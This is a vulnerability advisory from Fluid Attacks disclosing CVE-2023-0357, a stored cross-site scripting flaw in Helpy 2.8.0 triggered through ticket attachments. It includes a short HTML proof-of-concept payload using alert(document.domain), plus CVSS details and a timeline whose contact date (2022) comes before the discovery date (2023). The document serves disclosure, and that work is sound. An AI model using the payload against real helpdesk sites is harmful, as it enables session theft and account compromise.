---
slug: advisories/quayle/
title: Helpy 2.8.0 - Stored Cross-Site Scripting
authors: Carlos Bello
writer: cbello
codename: quayle
product: Helpy 2.8.0
date: 2023-01-16 12:00 COT
cveid: CVE-2023-0357
severity: 7.1
description: Helpy 2.8.0     -     Stored Cross-Site Scripting (XSS)
keywords: Fluid Attacks, Security, Vulnerabilities, Helpy, XSS
banner: advisories-bg
advise: yes
template: maskedAdvisory
encrypted: yes
---

## Summary

|                       |                                                          |
| --------------------- | -------------------------------------------------------- |
| **Name**              | Helpy 2.8.0 - Stored Cross-Site Scripting                |
| **Code name**         | [Quayle](https://en.wikipedia.org/wiki/Mac_Quayle)       |
| **Product**           | Helpy                                                    |
| **Affected versions** | 2.8.0                                                    |
| **State**             | Public                                                   |
| **Release Date**      | 2023-01-16                                               |

## Vulnerability

|                       |                                                                                                        |
| --------------------- | -------------------------------------------------------------------------------------------------------|
| **Kind**              | Stored cross-site scripting (XSS)                                                                      |
| **Rule**              | [010. Stored cross-site scripting (XSS)](https://docs.fluidattacks.com/criteria/vulnerabilities/010)   |
| **Remote**            | Yes                                                                                                    |
| **CVSSv3 Vector**     | CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N                                                           |
| **CVSSv3 Base Score** | 7.1                                                                                                    |
| **Exploit available** | No                                                                                                     |
| **CVE ID(s)**         | [CVE-2023-0357](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-0357)                          |

## Description

Helpy version 2.8.0 allows an unauthenticated remote attacker to exploit
an XSS stored in the application. This is possible because the application
does not correctly validate the attachments sent by customers in the ticket.

## Vulnerability

This vulnerability occurs because the application does not correctly validate
the attachments sent by customers in the ticket.

### Exploit

To exploit this vulnerability, simply submit the following malicious HTML code
as an attachment to the ticket.

```html
<!DOCTYPE html>
<html>
    <body>
        <script>
            alert(document.domain);
        </script>
    </body>
</html>
```

## Evidence of exploitation

![exploit-xss](https://user-images.githubusercontent.com/51862990/213021510-3812ee8c-d4ab-42a1-b463-915144d6470c.gif)

## Our security policy

We have reserved the ID CVE-2023-0357 to refer to this issue from now on.

* https://fluidattacks.com/advisories/policy/

## System Information

* Version: Helpy 2.8.0

* Operating System: GNU/Linux

## Mitigation

There is currently no patch available for this vulnerability.

## Credits

The vulnerability was discovered by [Carlos
Bello](https://www.linkedin.com/in/carlos-andres-bello) from Fluid Attacks'
Offensive Team.

## References

**Vendor page** <https://github.com/helpyio/helpy/>

## Timeline

<time-lapse
  discovered="2023-01-17"
  contacted="2022-01-17"
  replied=""
  confirmed=""
  patched=""
  disclosure="">
</time-lapse>
